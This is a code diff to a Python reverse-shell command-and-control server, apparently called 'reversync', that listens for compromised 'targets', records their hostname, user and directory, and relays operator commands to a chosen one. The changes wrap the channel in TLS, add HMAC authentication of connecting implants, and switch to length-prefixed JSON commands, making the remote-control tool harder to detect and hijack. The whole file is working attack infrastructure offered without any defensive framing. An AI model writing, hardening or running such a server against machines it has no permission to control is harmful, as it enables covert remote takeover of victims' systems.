@@ -1,23 +1,79 @@
 import asyncio
+import hashlib
+import hmac
+import secrets
+import ssl
 import json
 import struct
 import subprocess
+import sys
 from asyncio import CancelledError, IncompleteReadError
-from server_console import InteractiveConsole
+from interactiveconsole import InteractiveConsole
 from targetsInfo import TargetInfo, Targets
+from pathlib import Path
 
 
 # Server configuration
 SERVER_HOST = '127.0.0.1'
 SERVER_PORT = 1234
+KEY_PATH = 'pswd'
 
 
-def setup_data(data:bytes,address:str):
+
+def setup_data(data: bytes, address: str):
     jdata = json.loads(data)
     targets.info[address].cwd = jdata['cwd']
     targets.info[address].hostname = jdata['hostname']
     targets.info[address].username = jdata['username']
     return jdata
+
+
+async def perform_hmac_challenge(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
+    """
+    Performs a basic HMAC-based challenge-response authentication with the client.
+
+    Steps:
+    1. Server generates a random challenge and sends it to the client.
+    2. Client computes HMAC(challenge, shared_secret) and returns it.
+    3. Server verifies it by computing the expected HMAC and comparing it securely.
+
+    Returns:
+        True if the client is authenticated successfully, False otherwise.
+    """
+    # Step 1: Generate a secure 64-byte challenge
+    challenge = secrets.token_bytes(64)
+    writer.write(challenge)
+    await writer.drain()
+
+    try:
+        # Step 2: Wait for client's response (HMAC) with a timeout
+        client_response = await asyncio.wait_for(reader.read(1024), timeout=60)
+    except asyncio.TimeoutError:
+        return False
+
+    try:
+        # Step 3: Read the shared secret from file
+        with open(KEY_PATH, 'rb') as key_file:
+            shared_secret = key_file.readline().strip()
+
+        # Step 4: Generate expected HMAC using the shared secret and the original challenge
+        expected_response = hmac.new(shared_secret, challenge, hashlib.sha256).digest()
+
+        # Step 5: Securely compare client response with expected response
+        return hmac.compare_digest(expected_response, client_response)
+
+    except (FileNotFoundError, IOError):
+        # Secret key file missing or unreadable
+        return False
+
+
+async def send(writer: asyncio.StreamWriter, data: bytes):
+    """
+    Sends command to the target.
+    """
+    length = struct.pack(">I", len(data))
+    writer.write(length + data)
+    await writer.drain()
 
 
 async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
@@ -31,6 +87,14 @@ async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: 
     This function maintains a continuous session with a client,
     reading responses until the connection is closed or cancelled.
     """
+    auth = await perform_hmac_challenge(reader, writer)
+    if not auth:
+        console.error = f"[-] Refuse the connection from {writer.get_extra_info('peername')}"
+        writer.close()
+        await writer.wait_closed()
+        return None
+    data = json.dumps({'status': 'accept'},indent=4).encode()
+    await send(writer,data)
     client_address = writer.get_extra_info('peername')
     targets.connections[client_address] = writer
     targets.info[client_address] = TargetInfo(address=client_address)
@@ -40,10 +104,10 @@ async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: 
     try:
         while True:
             header = await reader.readexactly(4)
-            length = struct.unpack(">I",header)[0]
+            length = struct.unpack(">I", header)[0]
 
             response = await reader.readexactly(length)
-            response = setup_data(response,client_address)
+            response = setup_data(response, client_address)
             if client_address == targets.current_address:
                 console.shell_prompt = targets.prompt
             if response['stdout']:
@@ -56,7 +120,6 @@ async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: 
 
     except IncompleteReadError:
         console.output = "[-] Target disconnected unexpectedly."
-
     finally:
         # Clean up on disconnection
         targets.delete(client_address)
@@ -87,7 +150,7 @@ class TargetControlConsole:
         """
         try:
             while True:
-                command = await asyncio.get_running_loop().run_in_executor(None,console.b_input)
+                command = await asyncio.get_running_loop().run_in_executor(None, console.b_input)
 
                 if not command:
                     continue
@@ -133,11 +196,11 @@ class TargetControlConsole:
                 if command_lower.startswith("stop "):
                     try:
                         index = int(command_lower.removeprefix("stop "))
-                        addr = targets.get_target_address(index -1)
+                        addr = targets.get_target_address(index - 1)
                         targets.connections[addr].close()
                         await targets.connections[addr].wait_closed()
                         targets.delete(addr)
-                    except (IndexError,ValueError):
+                    except (IndexError, ValueError):
                         console.output = "[-] Invalid target index."
                     continue
 
@@ -146,7 +209,7 @@ class TargetControlConsole:
                         index = int(command.removeprefix("select target "))
                         targets.change_target(index - 1)
                         console.shell_prompt = targets.prompt
-                    except (IndexError,ValueError):
+                    except (IndexError, ValueError):
                         console.output = "[-] Invalid target index."
                     continue
 
@@ -154,8 +217,10 @@ class TargetControlConsole:
                 if targets.current_address:
                     writer = targets.connections.get(targets.current_address)
                     if writer:
-                        writer.write(command.encode())
-                        await writer.drain()
+                        data = json.dumps({'cmd':command}).encode()
+                        await send(writer,data)
+                        #writer.write(command.encode())
+                        #await writer.drain()
                     else:
                         console.output = "[-] Selected client is no longer connected."
                 else:
@@ -176,6 +241,9 @@ class TargetControlConsole:
             console.clear()
             console.output = "[-] Server console shutdown complete."
 
+def verify_files(cert:str,private_key:str,key:str):
+    return all(Path(file).exists() for file in [cert,private_key,key])
+
 
 async def run_reverse_shell_server():
     """
@@ -190,23 +258,28 @@ async def run_reverse_shell_server():
 
     # Small delay to ensure console starts before accepting connections
     await asyncio.sleep(0.1)
-
+    ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    ssl_ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
     try:
         # Try to bind to the specified host and port
         server = await asyncio.start_server(
             handle_reverse_shell_connection,
             SERVER_HOST,
             SERVER_PORT,
-            reuse_address=True  # optional but helpful on restarts
+            reuse_address=True,  # optional but helpful on restarts
+            ssl=ssl_ctx
         )
     except OSError as e:
         if e.errno == 98:
-            console.output = f"[-] Port {SERVER_PORT} is already in use."
+            console.error = f"[-] Port {SERVER_PORT} is already in use."
         elif e.errno == 13:
-            console.output = f"[-] Permission denied: you need elevated privileges to bind to port {SERVER_PORT}."
+            console.error = f"[-] Permission denied: you need elevated privileges to bind to port {SERVER_PORT}."
         else:
-            console.output = f"[-] Failed to start server: {e}"
+            console.error = f"[-] Failed to start server: {e}"
         console_task.cancel()
+        await asyncio.sleep(0.1)  # Give time for cancel to propagate
+        console.exit()
+        console.output = "[-] Reverse shell server terminated."
         return
 
     console.output = f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}"
@@ -237,6 +310,10 @@ if __name__ == "__main__":
     # Initialize target manager and main console instance
     targets = Targets()
     console = InteractiveConsole("reversync")
+
+    if not verify_files('cert.pem','key.pem','pswd'):
+        console.error = 'verify the files'
+        sys.exit(0)
 
     try:
         asyncio.run(run_reverse_shell_server())
